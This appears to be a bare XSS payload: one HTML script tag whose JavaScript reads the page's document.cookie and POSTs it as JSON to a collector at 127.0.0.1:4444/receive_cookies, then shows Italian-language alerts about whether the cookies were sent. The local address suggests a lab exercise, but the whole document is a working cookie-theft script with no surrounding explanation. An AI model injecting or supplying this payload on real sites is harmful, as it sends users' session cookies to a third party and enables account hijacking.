<script>var cookies=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','http://127.0.0.1:4444/receive_cookies',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({"cookies":cookies}));xhr.onreadystatechange=function(){if(xhr.readyState===4&&xhr.status===200){alert("Risposta server: "+xhr.responseText);console.log("Cookies inviati con successo");}else if(xhr.readyState===4){alert("Errore nell'invio dei cookie");console.log("Errore nell'invio dei cookie");}};</script>
